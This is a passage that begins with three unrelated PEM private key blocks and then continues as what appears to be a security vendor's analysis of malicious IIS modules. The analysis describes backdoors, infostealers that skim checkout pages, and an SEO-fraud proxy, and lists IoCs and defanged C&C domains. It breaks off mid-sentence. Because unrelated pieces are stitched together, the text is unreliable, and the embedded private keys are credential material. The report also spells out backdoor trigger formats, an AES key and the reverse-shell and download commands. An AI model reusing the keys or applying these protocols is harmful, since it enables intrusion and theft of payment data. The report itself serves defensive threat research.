KEY----MIICdwIBADANBgkqhkiG9w0BAQEFAASCAmEwggJdAgEAAoGBAKbcOW5n/YV7vUKBD90FslgWQRUIOulpoKc\nByKyPw80ZqcmHS9tBN5b3hSJ2rD6EoNTDa6BEJ7x7PN4hB2hJ/OGAWC71RrBiKj9J4xsAk1p+v0Crc+8FZR\nazv+idnXdFN/NEXgtbm6HEZ1Y9lG+OMb3Xln1F/U9umV/ZlebCUyvlAgMBAAECgYAnuDehnPZ//mccfB17F\nv6Psmh2qblgU6kO6EFNNoG9AnVkyCSaAinJ8YzLGeXBkg+45fXqNh8hYlKoa8NYI3ijECJpYQ6PXU/jjize\n8DUdvi0cn/pXI/L6eYeyaSnw0afEqS9jT4aX/tMM5blF6CxCv3EF+JEojlCcEqY9hIM1sQJBALaLXIPRPGM\nbgoYcDGQfF2tVejJcwkHTtoN5cujSQJiK0EVc3bRO3nynnVxnJioPK7iNmknfGsUWIBNqJj5xJ2kCQQDqAS\n1UOdJJ6iM7+MsI2x54GPPR4D3IxqjNLqiP8KLg8rVyDWuJOO5qIn82GC5/Ggfj+tdjzxemcxZePBfmqm0dA\nkEAgfCj82UuwjGj8MjofSCwsAPRjyX+VZNZ+S6rgFWiC7PMW4OmgaIet8csucjnHstbyOxrZqg8ywxb2tYV\n0R8E+QJBAKJC1q/EuHDQjkYTqpYleudERi2OFMmYF4zPgcrtzcO2CONhMuQgOhIWgad89SDlZ/tKAPkQrRG\naVDRb7ybfnnECQH6gtqTUJIC8xWm+OLeOsKUW4h1SgHysmDCimTOeke//YAQIYNIVH6sXq/10NtH0Xv7zck\njpRblBUQgk4Iu6EUE=\n-----END PRIVATE KEY---------BEGIN PRIVATE KEY----MIICdwIBADANBgkqhkiG9w0BAQEFAASCAmEwggJdAgEAAoGBAMWWvT3nNfzMr+bF12nO68qs1c/KicQ9z9D\nA2yRw0nLNjsP/94Dr4xcMXVoc2jGjC/2uCRxUnnOiKUhzbjFdtFwv9t+ubjblsp4lDaSo7UDfH4fn2sQsmk\nme8WeuGjmy1Ie7WM33roSSbcnkBeAFi09Eb1eQiUCk2WBCjNyJj7kTAgMBAAECgYAY1FHwkvr2SxR5p/fjX\nHTF8cUmiPmZ9viD75A6OpE/ivQ7ThGgmkPdtBiRB9olbatGlBWiAUIuHr0YVSUOQAu3ZyNu9jpAjimrG1n0\nhWdGgnN0PbzpAAuPeA9edPDlnNqW0JCBdpG1JstaMLHaurWmZ+pNlJOXerHMPnhFEHBjOQJBAMuYrgcVhJ4\nM+BhHUay9TYEjplu/IVqLpZ8m/6+tMvcnki4RV18K8+kkuEa2wBAFM84t4Ikmd5r8o1cO+zs2n1sCQQD4cj\n\n```\nWkoqt1mWSNpqMUcJwqtd8tyqMGI1u5E9QNDk8PWZmFJ/E5V733rnfl5BoNCxnAD3cIWBscAdr0hX6uvnKpA\n```\nkEAxzW8Sigu2+r6sd7OtsN/W3WDaFAKlasAQkqJcd55eMXaTYMgR1nTMPOB74cPRF2ixAG1qtzduOOr+xoo\njlay8wJBAJgiP4zv+3RImNVQm/4RMt/IfMBqnEdO8YS0ip3wDCOHJ0Xtfn4xp2b6k/rXIcio6ny8O5SFdxx\nAWpZvBHL2tfkCQFM6iVcYSQNU1je2LwJiLbhl/Jif/LFSGndZIFS6v5cuBCMQ2LdbSKOI7nJUa2nsxBcSan\nzEOLDWIXXrJGbd7gs=\n-----END PRIVATE KEY---------BEGIN PRIVATE KEY----MIICdgIBADANBgkqhkiG9w0BAQEFAASCAmAwggJcAgEAAoGBALkeAveIwS0z8Vi29YJsG05N9vWS8s5gfKO\ny3UNE2VBK30+gH1rwUVlaMZpO+gyOKwYHMNBLQ8NpRfHy2ey/7snN+q9XcpAjX4Q1A0bhafN/viYWNAoxWG\ni1n69SwZ7Nd77E5zSB+re4JnK6p290+hvj03wCdI7BgrBEBLenPvqvAgMBAAECgYAfF47ZA6Oqk3hcdbJru\nvulHcw2d/2HM0aL+i1WsJgtd73lMlhB3m5TayY8rDosZK6OPyPwQEv75NEmL6txq9UPz6a0X+BxvuRkMwXa\nBIH6MWAsFu/x8DkNlM1R2cjSkLOxzkqYhhyRss2+spsOdMGIGoIIZv39e0cVmywMZRN2cQJBAPB/hmYDDAc\ngXfhzoRsgq1AdVqgQnZ3wcLkr8HhTCAZt77zfSbBp7ecUqcrN4Sua+6dZXGz7SZKZVhdID8eTHXECQQDFDK\nSHOcc4ypJ53XPVbTWMkNVnmjYjokFFm+Ihqeu2BRZfRQ1fncsZSIsNyYHTRgMDV+cpgZXO/6iFbGUNyAofA\nkAEcabPHcFMJGn4HFLeyHTB7zjZtCzlbTr4APrZjlc4nzFt4QZgjySJP5V/nNxLTPrXdcxCa0ZJwjGYDonU\nG0DRAkA3Nv+zVKFabIj21PLsTxm+NadWzIN3ILQhiTioLjD6ZBqMv5Crxk9u2kD8sAZM6UVW3n7Lxp/vzPu\nvx1vZrMAJAkEA8AVRI3i1jbZ7lbA2nmTyRqdwnCdxYxfBukC9Kv91o8RvWqpg/ZocnzR3Ok8TR/E9PArmn1\nTRYeml0Z9G0pfTRA==\n-----END PRIVATE KEY----\n### Group 3\n\n```\nGroup 3 is a simple backdoor that allows the attacker to execute files and shell commands on the\n\ncompromised server. According to our telemetry, it has been in use since April 2021, targeting a small\n\nnumber of IIS servers in Ukraine.\n\n#### ESET detection names\n\nWin64/BadIIS.Q\n\n\n-----\n\n#### Implemented handlers\n```\nCHttpModule::OnSendResponse\n\n Features\n\n```\n**Feature** **Comment**\n\n\nBackdoor\n\n\nSupported backdoor commands:\n\n - Execute a shell command\n\n - Execute a file\n\n\n#### Backdoor mode\n\nBackdoor functionality of this malware can be triggered via special attacker-crafted requests,\n\nwith base64-encoded command lines embedded in a specific HTTP header (for security reasons,\n\nwe have chosen not to disclose the name of the header). This command line is decoded via\n```\nCryptStringToBinaryA and executed via the CreateProcessA API. The backdoor then reads the\n\n```\nresult of this command via an unnamed pipe, and appends the base64-encoded data to the HTTP\n\nresponse body for this request.\n\n#### IoCs\n\nSHA-1\n```\nD33FA7C550AC0A7B47EB690FE9C3750CAF04EB68\n\n```\nFilenames and paths\n```\nstatdoc.dll\n\n### Group 4 (RGDoor)\n\n```\nRGDoor is a simple IIS backdoor that was found on web servers belonging to Middle Eastern\n\n[government organizations, and to one financial and one educational institution, as reported by Unit 42 in](https://unit42.paloaltonetworks.com/unit42-oilrig-uses-rgdoor-iis-backdoor-targets-middle-east/)\n\nJanuary 2018. No other RGDoor activity has been reported since.\n\n#### ESET detection names\n\nWin64/BadIIS.R\n\n#### Implemented handlers\n```\nCHttpModule::OnBeginRequest\n\n Features\n\n```\nFeature Comment\n\n\nBackdoor\n\n#### Analysis\n\n\nSupported backdoor commands:\n\n - Execute a file or a shell command\n\n - Upload a file\n\n - Download a file\n\n\n[We will limit this section to clarify one misconception from the original blogpost; please refer to the Unit 42 report](https://unit42.paloaltonetworks.com/unit42-oilrig-uses-rgdoor-iis-backdoor-targets-middle-east/)\n\nfor a detailed analysis.\n\n\n-----\n\nUnlike the claim in that 2018 blogpost, RGDoor doesn’t distinguish between inbound HTTP GET\n\nand HTTP POST requests – any method can be used to activate the backdoor, as long as the\n\nspecifically crafted Cookie header is present. We verified the behavior on both known samples[10]\n\nof this backdoor in our testing environment, and can confirm that it reacts the same to any\n\nmethod, as shown in Figure 28. Note that we used the same example as given in the blogpost:\n```\nNzkwcCM8OzU5PQ== is whoami command, XOR encrypted with 0x54 and then base64 encoded, while\nPT0ndDUkJCQ7OzgIMDEyNSE4IDUkJCQ7OzheVA== decrypts to the result of the whoami command, iis\napppool\\\\defaultapppool\\n\\x00, encrypted and encoded in the same way.\n\n```\nFigure 28 // The RGDoor backdoor accepts any HTTP verb with its malicious requests\n\nThe reason for this misconception lies in the interpretation of the SetRequestNotifications method,\n\ncalled from the RegisterModule entrypoint. According to Unit 42, this function can be used to\n\n“configure the module to handle GET requests (dwRequestNotifications) and/or POST requests\n\n(dwPostRequestNotifications). … In RGDoor, the code calls this function with arguments that ignore\n\ninbound HTTP GET requests, but act on all HTTP POST requests seen by the IIS server…”.\n\nTo clarify, the two arguments of this function (dwRequestNotifications and\n\n**dwPostRequestNotifications) are not related to the HTTP method at all – these bitmasks refer**\n\nto the sequence of request-processing pipeline events, and allow the module to register for these\n\nevents. RGDoor sets dwRequestNotifications to register its OnBeginRequest handler, and leaves\n\n**dwPostRequestNotifications empty (for example, the OnPostBeginRequest handler is not**\n\nimplemented by RGDoor). This is illustrated in Figure 29.\n\nNote that IIS modules can modify their behavior based on the incoming HTTP request method; however,\n\nthat distinction would be implemented in their handlers and RGDoor doesn’t use this option.\n\n10 SHA-1: 5447283518473EA8B9D35424532A94E2966F7A90, A9143B0FC38B6329D5DFBFFC4AA91B5F57211DA0\n\n\n-----\n\nFigure 29 // RGDoor registers its OnBeginRequest handler via SetRequestNotifications\n\n#### IoCs\n\nSHA-1\n```\n5447283518473EA8B9D35424532A94E2966F7A90\nA9143B0FC38B6329D5DFBFFC4AA91B5F57211DA0\n\n```\nFilenames and paths\n```\nHTTPParser.dll\n\n```\nTrafficHandler.dll\n\n### Group 5\n\nGroup 5 is an IIS infostealer, with the ability to collect and exfiltrate payment information obtained\n\nthrough intercepting regular HTTP traffic on the server. We have detected this malware on only a\n\ncouple of IIS servers in the USA, between September 2020 and January 2021. All analyzed samples seem\n\nto be tailored for specific e-commerce websites.\n\n#### ESET detection names\n\nWin64/BadIIS.F, Win64/BadIIS.O\n\n#### Implemented handlers\n```\nCHttpModule::OnPostBeginRequest\n\n```\n\n-----\n\n#### Features\n\nFeature Comment\n\nCollects and exfiltrates sensitive information from regular traffic\nInfostealer\nbetween the compromised server and its clients.\n\n#### Infostealer functionality\n\nThe malware intercepts regular inbound traffic to the compromised server, filtering POST requests with\n\na specific path in the URL, which differs across samples:\n```\n   /checkout/checkout.aspx\n   /checkout/Payment.aspx\n\n```\nMatching HTTP requests are logged in the log file:\n```\n   C:\\Windows\\Temp\\cache.txt\n\n```\nThe data collected in this file can be exfiltrated via a specifically crafted HTTP request from the attacker.\n\nThis request must have an X-IIS-Data HTTP header set to a hardcoded password (that we have\n\nchosen not to disclose), and must be sent to a URL path specified in the malware sample:\n```\n   /privacy.aspx\n   /checkout/Payment.aspx\n\n```\nOnce the malicious module detects such a request, it copies the contents of the log file to the HTTP\n\nresponse.\n\n#### IoCs\n\nSHA-1\n```\n706EAB59C20FCC9FBC82C41BF955B5C49C644B38\n7A2FA07A7DC05D50FE8E201A750A3DC7F22D6549 \nA1C5E7424E7C4C4C9902A5A1D97F708C6BB2F53A\n\n```\nFilenames and paths\n```\ndir.dll\nisapicache___.dll\nisapicache_.dll_\nC:\\Windows\\Temp\\cache.txt\n\n```\nNetwork indicators\n\nTargeted URIs\n```\n/checkout/checkout.aspx\n/checkout/Payment.aspx\n/privacy.aspx\n\n```\nHTTP headers\n```\nX-IIS-Data\n\n```\n\n-----\n\n### Group 6 (ISN)\n\nGroup 6 refers to another IIS infostealer, capable of collecting and exfiltrating payment information\n\nobtained through intercepting regular HTTP traffic on the server. The malware was discovered and\n\n_[reported by Trustwave in December 2013, when it was seen targeting credit card data on e-commerce](https://www.trustwave.com/en-us/resources/blogs/spiderlabs-blog/the-curious-case-of-the-malicious-iis-module/)_\n\nsites. No other ISN activity has been reported since.\n\n#### ESET detection names\n\nWin32/Spy.IISniff.A, Win64/Spy.IISniff.A\n\n#### Implemented handlers\n```\nCHttpModule::OnBeginRequest\nCHttpModule::OnReadEntry\n\n Features\n\n```\n**Feature** **Comment**\n\nCollects and exfiltrates sensitive information from regular traffic\nInfostealer\nbetween the compromised server and its clients.\n\n#### Analysis\n\n[Please refer to the Trustwave report for a detailed analysis.](https://www.trustwave.com/en-us/resources/blogs/spiderlabs-blog/the-curious-case-of-the-malicious-iis-module/)\n\n#### IoCs\n\nSHA-1\n```\nA43D964E709EF8F7F035B85ED4AE9B26D4394B58\nE00E8477CEE2BEDA5B67346C9742C4002D6B567A\n\n```\nFilenames and paths\n```\niis7_32.dll\niis7_64.dll\n\n### Group 7\n\n```\nGroup 7 is the most complex IIS backdoor we have analyzed to date. On top of supporting a wide range\n\nof backdoor commands, it also has functionality to clear traces of malicious activity by disabling server\n\nlogging of attacker-crafted requests.\n\nAccording to our telemetry, the backdoor has been active since at least July 2020, and has been used\n\nwith Juicy Potato (detected as Win64/HackTool.JuicyPotato by ESET security solutions), which is\n\na privilege escalation tool. Affected servers are located in Canada, the USA and the Netherlands.\n\nWe suspect the attackers first obtain the initial access to the IIS server via some vulnerability, and then\n\nuse Juicy Potato to obtain the administrative privileges that are required to install a native IIS module.\n\n#### ESET detection names\n\nWin32/BadIIS.F, Win64/BadIIS.U\n\n\n-----\n\n#### Implemented handlers\n```\nCHttpModule::OnBeginRequest (classifying inbound requests)\nCHttpModule::OnEndRequest (backdoor functionality)\nCHttpModule::OnLogRequest (anti-logging feature)\n\n Features\n\n```\n**Feature** **Comment**\n\nSupported backdoor commands:\n\n\nBackdoor\n\n\n\n- Collect system information (computer and username, logical drive information)\n\n- Create, rename, move or delete files or folders\n\n- Upload or download files\n\n- Modify file timestamps\n\n- Map a local drive to a remote drive\n\n- Execute shell commands\n\n\n#### OnBeginRequest handler (request classification)\n\nThe OnBeginRequest handler implements request classification. If an attacker request is identified, the\n\nmodule sets flags in the pHttpModule object so that the other two event handlers (OnEndRequest,\n```\nOnLogRequest) can determine quickly whether this request should be handled or not.\n\n```\nUnlike the other analyzed IIS backdoors, Group 7 doesn’t use hardcoded passwords or specific URIs\n\nfor its attacker requests – instead, the requests have a specific relationship between the URL, Host\n\nand Cookie headers. This makes detection of irregular activity much more difficult (as opposed to, for\n\nexample, flagging custom HTTP headers).\n\nTo recognize an attacker request, the malware computes the MD5 of both the Host header and the URL\n\nusing a custom implementation of the MD5 function, and splits each into four double words:\n```\n   <h0><h1><h2><h3> = md5(Host Header value)\n   <r0><r1><r2><r3> = md5(Raw URL value)\n\n```\nThe Cookie header of such a request then contains a substring built from these values:\n```\n   <r1><h2>=<h3><r2><r3><r0><h0><h1>\n\n```\nThis relationship is presented in Figure 15.\n\nAdditionally, the HTTP request must have a specific structure (that we have chosen not to discuss in\n\ndetail, to protect the potential victims). The HTTP body is AES-CBC encrypted and base64 encoded,\n\nusing these parameters:\n\n- Encryption key: DA1F8BE19D9122F6499D72B90299CAB080E9D599C57E802CD667BF53CCC9EAB2\n\n- IV: 668EDC2D7ED614BF8F69FF614957EF83EE\n\n#### OnEndRequest handler (backdoor mode)\n\nThe HTTP body of an attacker’s request includes backdoor commands and arguments, organized as key\nvalue pairs, as listed in Table 8.\n\n\n-----\n\nTable 8 // Group 7 backdoor commands\n\n**Key** **Value**\n\n`/mode` Command type\n\n`/action` Command\n\n```\n/path\n/binary\n/data\n…\n\n```\n\nCommand arguments (see Table 9 for full list)\n\n\n`/credential/username` Local user username, used for impersonation\n\n`/credential/password` Local user password, used for impersonation\n\nIf the credentials are present, the backdoor uses them to log in as the user (via LogonUserW,\n```\nImpersonateLoggedOnUser) to execute the backdoor commands in the user’s context.\n\n```\nThe command arguments are also organized as nested key-value pairs, as listed in Table 9.\n\nAfter executing the backdoor command, the malware modifies the HTTP response to the attacker’s\n\nrequest. The response body is organized as key-value pairs, with the entries listed in Table 9 and two\n\nadditional entries based on the GetLastError result (or custom error messages):\n```\n   /error/code\n   /error/message\n\n```\nThis data is encrypted with the same AES key as the original attacker request. Interestingly, the\n\nencrypted data is then embedded within a fake PNG image, between the PNG file headers as a TEXT or\n```\nBLOB chunk. Finally, the malware replaces the original HTTP response body with the fake PNG file, and\n\n```\nsets the Content-Type header to image/png to give more credibility to this charade.\n\nThe attackers use this technique in an attempt to keep their C&C communications unnoticed.\n\n#### OnLogRequest handler (anti-logging)\n\nThe final handler implemented by Group 7 backdoors is OnLogRequest – this handler is called right\n\nbefore the IIS server logs a processed HTTP request.\n\nThe attackers use the handler to modify the log entries for requests coming from the attackers, to make\n\nthem look like casual requests. These steps are taken:\n\n- Rewriting the HTTP method in the request to GET\n\n- Rewriting the URL from the request to /\n\n- Deleting these headers from the request: Cookie, Origin, Referer, Sec-Fetch-Mode, Sec-Fetch```\n Site, Content-Type, Content-Length, X-Forwarded-IP, X-Forwarded-For, X-Forwarded-By,\n X-Forwarded-Proto\n\n```\nWith the log entries modified this way, the attackers attempt to further hide traces of their malicious\n\nactivities, to make potential forensic analysis more difficult.\n\n\n-----\n\nTable 9 // Group 7 backdoor commands\n\n**Returned data**\n**Command type** **Command** **Arguments**\n**Command description** **(map structure or**\n**(/mode value)** **(/action value)** **(key names)**\n**description)**\n\n\n`init` N/A N/A\n\n\nCollects basic system information:\ncomputer name and domain,\nusername and domain, logical drives\ninformation.\n\n\nCollects information about the files\n```\nlist /path\n```\nin the specified folder.\n\n```\n/computer/domain\n/computer/name\n/user/domain\n/user/name\n/ /name\n /type\n/ /name\n /attr\n /size\n /create\n /access\n /write\n\n```\nThe contents of the file,\nencrypted and embedded\nwithin a fake PNG image\n(a PNG header followed\nby non-image data).\n```\n/- \n\n```\n**/file**\n```\n /attr\n /size\n /create\n /access\n /write\n/\n```\n**/file**\n```\n /attr\n /size\n /create\n /access\n /write\n\n```\n**/files**\n```\n /code\n /name\n\n```\n**/files**\n```\n /code\n /name\n\n```\n\nDownloads the file with the\nspecified name from the\ncompromised IIS server.\n\nCreates a new file or directory in\nthe specified path. Optional /data\nargument can hold the file content.\n\nUploads a file with the specified\nname to the compromised server.\nThe /data entry contains base64encoded file content.\n\nDeletes the list of files/directories in\nthe given path.\n\nCopies or renames files from the\nlist, from the source directory to the\ndestination directory.\n\n\n**file**\n\n```\n           /path\nget\n           /binary\n           /path\ncreate /directory\n           /data\n           /path\nupload\n           /data\n\n```\n```\n           delete\n           move\n           time\n           map\ndrive\n\n```\n```\n/path\n\n```\n**/files**\n```\n /name\n /attr\n/path\n/dest\n/copy\n\n```\n**/files**\n```\n /name\n /new\n/path\n/create\n/access\n/write\n/letter\n/share\n/username\n/password\n\n```\n\nCreates a mapping between a\nlocal and a remote drive, using\nthe specified credentials for the\nnetwork resource\n\n\nModifies file timestamps N/A\n\n\nN/A\n\n\n`remove` `/letter` Removes an existing drive mapping N/A\n\n```\ncmd exec /cmd\n\n```\n\nExecutes the specified command,\neither under the context of the\ncurrent user, or the user provided in\narguments.\n\n```\n/output\n\n```\n\n-----\n\n#### IoCs\n\nSHA-1\n```\n22F8CA2EB3AF377E913B6D06B5A3618D294E4331\n435E3795D934EA8C5C7F4BCFEF2BEEE0E3C76A54\nCED7BC6E0F1A15465E61CFEC87AAEF98BD999E15\n\n```\nFilenames and paths\n```\ncache.dll\nlogging.dll\n\n### Group 8\n\n```\nGroup 8 consists of IIS backdoors, commonly deployed under the names FilterSecurity32.dll\n\nand FilterSecurity64.dll. We initially obtained these samples from VirusTotal, where they were\n\nfirst uploaded in October 2018 and until late 2020. The main difference between the samples is the\n\nhardcoded password, which is used by the attackers to activate the backdoor, and probably also to\n\ndistinguish between campaigns.\n\nWe performed internet-wide scans using these passwords to identify potential victims, by sending\n\nrequests that verify the presence of the malware on the IIS server. We found 17 servers compromised\n\nwith Ver1.0.1 of the malware, and 7 servers running Ver1.0.2, with all 24 of these in Southeast Asia\n\nbut mostly in China. We notified all of these victims about the compromise.\n\nNote that this malware family has never been publicly analyzed; however, we have found an incident\n\n[response report published in 2019 that refers to two malicious IIS modules named FilterSecurity32.dll[11]](https://www.secpulse.com/archives/113500.html)\n\nand FilterSecurity64.dll[12]. We were not able to obtain those two samples; based on the behavior\n\ndescribed, however, we assume they are different versions of the same backdoor.\n\n#### ESET detection names\n\nWin32/BadIIS.B, Win64/BadIIS.B, Win64/BadIIS.C\n\n#### Implemented handlers\n```\nCHttpModule::OnBeginRequest\n\n Features\n\n```\n**Feature** **Comment**\n\n\nBackdoor\n\n\nSupported backdoor commands:\n\n - Collect system information\n\n - Run a reverse shell\n\n - Upload a file to the compromised server\n\n - Execute a file\n\n\n#### Backdoor mode\n\nAttackers can activate the backdoor functionality of this malware by sending a special HTTP request to\n\nthe compromised server, with the special Cmd header present that has the following format:\n```\n   <password>$<command>$<arguments>\n\n```\n11 MD5: 371cd2a75c9c621117678f fd20ce0a12\n12 MD5: 80887b65317f2d45761c1c2b96970e0c\n\n\n-----\n\nThe <password> consists of 32 hexadecimal characters and is hardcoded in each sample. We have\n\nchosen not to disclose these passwords, so as not to allow anyone to take over the compromised\n\nservers.\n\nThe backdoor command can be followed by multiple optional arguments delimited by the $ character,\n\nfor example dw$<url>$<filename> command instructs the backdoor to download a file from <url>\n\nand store it under <filename> on the compromised server. All the Group 8 backdoor commands are\n\nlisted in Table 10.\n\nTable 10 // Group 8 backdoor commands\n\n**Command**\n**Command arguments** **Command description** **Return value[13]**\n**name**\n\nInternal version string. We have seen\n`vr` N/A Queries internal version string\n```\n                                          Ver1.0.1 and Ver1.0.2.\n\n```\n\n`in` N/A Collects system information\n\n\n`rs` IP address\n\n\nConnects to the IP address\nsupplied by the attacker and\nthen executes received data as\nshellcode in a new thread\n\n\nDownloads a file from the\n`dw` URL, filename specified URL and saves it under\nthe given name\n\n\nSystem information: computer name and\ndomain, OS version and architecture,\nlanguage information, server username,\nlist of logged on users, physical path of\nthe server\n```\nConnect OK!\\r\\nYou are f*cked!\\\n\n```\n`r\\n` or `Sh*t!Error\\r\\nWhere is the`\n```\nGod!!\\r\\n\n\n```\n`Good!Download OK!\\r\\n` or\n```\nSh*t!Download False!\\r\\n\n\n```\n\nExecutes the specified file with `Good!Run OK!\\r\\n or` `Sh*t!Run`\n`ex` Filename, command line\nthe specified command line `False!\\r\\n`\n\n(other) N/A  - `Sh*t!캴횪 횸쇮`\n\nAfter handling the backdoor command from the attacker’s request, the malicious IIS module clears the\n\nHTTP response previously set by the IIS server (via a call to IHttpResponse::Clear) and replaces it\n\nwith its own response with these characteristics:\n\n- The Content-Type header is set to text/plain\n\n- The HTTP response body is set to the return value listed in Table 10 above, in cleartext\n\n#### IoCs\n\nSHA-1\n```\n0AC34B71F1CBED482579509DDF12DC28312E11A5\n1B9EC94251AD5E8F407584DC786B261CADD7FA8F\n21618E3FE6D133403320B4430054394AED944105\n36741260BDE2B9304302F5AEB63CAEB309979554\n4F6EAD034BF9A0B27ECFF16A08DB3ED57EA9C7D4\n528527C8166FC55C2D80824D7C94FD574EACD1BC\n54E98E2655B39DFA486A01A09AC4920B7639401D\n5924800E432731C6699A80EF4D6AD9496EB1BF98\n5A5545B868EC41A15810E9351ECA93110C878BC1\n8B0D9F3DBA9B05FFB91B8C77786B6FD85BEA6944\nA70CA39BE949629C8EED1A71258ADB259E6A9D9E\nAED3625099606849755A6C25022D072BCE7E9EE7\n\n```\n13 Some of the return values have been redacted\n\n\n-----\n\n```\nD669F4DDE56DF8D032520399EDEA0F9971063F38\nE3FE87183E5F63A63915EB9B3740218A42CD6CF3\n\n```\nFilenames and paths\n```\nFilterSecurity32.dll\nFilterSecurity64.dll\niiscrash32.dll\niiscrash64.dll\n\n```\nNetwork indicators (HTTP headers)\n```\nCmd\n\n### Group 9\n\n```\nGroup 9 is an IIS proxy that is designed to relay C&C communication between compromised hosts and\n\nthe C&C server. The same family can also perform SEO fraud by manipulating HTTP responses that\n\nthe compromised IIS server returns to search engine crawlers. The attackers can use this malware to\n\nmanipulate search engine algorithms to artificially boost SEO of third-party websites, by abusing the\n\nreputations of the websites hosted on the compromised web server.\n\nThis malware family has been under active development since 2019, and we have seen several variants\n\nof this malware, with differences in functionality. In this section, we focus on the A variant of the family.\n\n[Note that the B variant was already mentioned in an incident response report published in 2019 by](https://www.secpulse.com/archives/113500.html)\n\nSecpulse (along with instances of a Group 8 backdoor found on the same compromised server);\n\nhowever, no analysis of this family is publicly available.\n\n#### ESET detection names\n\nWin32/BadIIS.C, Win32/BadIIS.D, Win32/BadIIS.E, Win32/BadIIS.H, Win64/BadIIS.A, Win64/BadIIS.G,\n\nWin64/BadIIS.I, Win64/BadIIS.K, Win64/BadIIS.M, Win64/BadIIS.N, Win64/BadIIS.P\n\n#### Implemented handlers\n\n- Variable per variant of this family – a combination of OnBeginRequest, OnSendResponse and\n```\n OnGlobalPreBeginRequest\n\n#### Features\n\n```\n**Feature** **Comment**\n\nRelays HTTP requests between compromised hosts and\nProxy\ntheir C&C server.\n\nReplaces responses to HTTP requests from web crawlers\nSEO fraud\nwith attacker-controlled content.\n\n#### Initialization\n\nGroup 9 stands out for its complex RegisterModule function. In this function, it creates instances of\n\nthe core classes and registers for events that should be handled by the module.\n\nUnlike other analyzed families, it also uses this place for initialization. It decrypts strings (XOR 56) and\n\ninitializes a global map structure with these key-value pairs:\n\n\n-----\n\n```\n“url”: “http://qp.008php[.]com”\n“keys” (or “key”):\n“yisouspider|yisou|soso|sogou|m.sogou|sogo|sogou|so.com|baidu|bing|360”\n“path”: “app|hot|alp|svf|fkj|mry|poc|doc|20”\n“zz”: “http://qp.008php[.]com/zz.php”\n\n```\n\nThis structure is then used by the OnBeginRequest and OnSendResponse handlers.\n\nNote that all its values vary across the samples – refer to the IoCs section for the list of all the C&C URLs\n\nwe have seen.\n\n#### OnBeginRequest handler\n\nIn the OnBeginRequest handler, this malware implements the proxy functionality and initialization for\n\nthe SEO fraud functionality.\n\nSEO fraud initialization\n\nIncoming HTTP requests whose User-Agent header matches the\n```\n(yisouspider|yisou|soso|sogou|m.sogou|sogo|sogou|so.com|baidu|bing|360) regular\n\n```\nexpression, are considered search engine crawler requests. For these requests, this handler removes the\n```\nAccept-Encoding header from the request. Thus, the server will not compress the response and the\n\n```\nmalware can easily inject additional data into the response without having to deal with the compression\n\nalgorithm.\n\nFor all other HTTP requests, the OnBeginRequest handler calls the DisableNotifications method\n\nwith the RQ_SEND_RESPONSE parameter, which means that the OnSendResponse handler will not be\n\ntriggered for those requests.\n\nFigure 30 // Disabling notifications for the BeginRequest event\n\n\n-----\n\nProxy functionality\n\nFor incoming HTTP requests whose URL matches the ^/<path> regular expression\n\n(e.g. ^/(app|hot|alp|svf|fkj|mry|poc|doc|20)), the malicious IIS module contacts the C&C\n\nserver where it relays the URI, HTTP headers and client IP address from the original request, and\n\nreplaces the HTTP response with the data obtained from the server.\n\nFor C&C communication, the malware uses WinHTTP API, with option set to\n```\nWINHTTP_OPTION_REDIRECT_POLICY_NEVER.\n\n#### OnSendResponse handler\n\n```\nThe OnSendResponse handler implemented by this malware is only triggered for requests coming from\n\nselected search engine crawlers (as pre-processed by the OnBeginRequest handler).\n\nIn these cases, the malicious IIS module obtains data from its C&C server (using a URL from its\n\nconfiguration) and injects this data into the HTTP response for the request.\n\n#### IoCs\n\nSHA-1\n\nVariant A\n```\n279D841539212D4F159404417404827EBC17B8D7\n44933C61C82B9FB7C2A17B32C010C5B044B638F3\n4E8B84412101112E73F846545A412127AA5DCEB8\n52FDE6863D8C3E79913B29EFA656C3B32FE2CF45\n5B205F3C19CAA177C0D32EBCCCAA3D3202764132\n62C47260DC013DDF625F0016736576BDF4E3B212\n64DF8B5AD43A0C4D81DFF075898E492FBAF1CD9E\n7DA9FBD4BAB842DADB943790E69B0C15E74EC614\n93C40123D11EFC0C75F9C8E515EA49B4D047D8C1\nA3E64F4D0898B77E5AE931029BCD330F2694643E\nA41F73A3A28E46ADBD6753F9B0A005E8A4FA55FD\nA42893843059ED9922FDAFFF0A02DF4F39519930\nB8051F1B51EC093BA56B1F70C8AE63EB6A9644C1\nBD98ABC510AC3DF66E21C3CDCEE7BDFC1A326AC5\nFABCEFF3B03D3DA0B338E2EC0F7D47E83E86F720\n\n```\nVariant B\n```\n3A3DF03DA61F86CEFEB7A1546421346CE2608DE1\n7080CC770A99FF57FD899E367B7F2A430FC55CD1\n8A25CBCF5B7DEBCA8A9E55D233E816EA6FBE8A0F\nB626B9A712FCF957438DBED889575D3F9E1B33C8\nDD9F72DE1070903359ACEA98884A953B23CB7354\n\n```\nVariant C\n```\n72FB52C21EDC50D79DDDAAAE6EE473713CE4F82D\n\n```\nFilenames and paths\n```\nautehbas.dll\nautohbas.dll\ndirshow.dll\nhttpevt.dll\n\n```\n\n-----\n\n```\nmscorevt.dll\nsortkey.dll\nwebdac.dll\nwindows.dll\n\n```\nNetwork indicators (C&C servers)\n```\nhttp://20.3323sf[.]com\nhttp://20.3323sf[.]com/zz.php\nhttp://bj.whtjz[.]com\nhttp://bj.whtjz[.]com/zz1.php\nhttp://bj2.wzrpx[.]com\nhttp://bj2.wzrpx[.]com/zz1.php\nhttp://cs.whtjz[.]com\nhttp://cs.whtjz[.]com/zz.php\nhttp://df.e652[.]com\nhttp://df.e652[.]com/zz1.php\nhttp://dfcp.yyphw[.]com\nhttp://dfcp.yyphw[.]com/zz1.php\nhttp://es.csdsx[.]com\nhttp://es.csdsx[.]com/zz.php\nhttp://hz.wzrpx[.]com/pq.php\nhttp://hz.wzrpx[.]com/zk.php\nhttp://id.3323sf[.]com/wh1.php\nhttp://id.3323sf[.]com/zid.php\nhttp://qp.008php[.]com\nhttp://qp.008php[.]com/zz.php\nhttp://qp.nmnsw[.]com\nhttp://qp.nmnsw[.]com/zz1.php\nhttp://sc.300bt[.]com\nhttp://sc.300bt[.]com/zz.php\nhttp://sc.wzrpx[.]com\nhttp://sc.wzrpx[.]com/zz1.php\nhttp://sf2223[.]com/xin.html\nhttp://sx.cmdxb[.]com\nhttp://sx.cmdxb[.]com/zz1.php\nhttp://sz.ycfhx[.]com\nhttp://sz.ycfhx[.]com/zz1.php\nhttp://xpq.0660sf[.]com\nhttp://xpq.0660sf[.]com/zy.php\nhttp://xsc.b1174[.]com\nhttp://xsc.b1174[.]com/zz1.php\n\n```\n\n-----\n\n### Group 10\n\nGroup 10 is IIS malware designed to manipulate HTTP 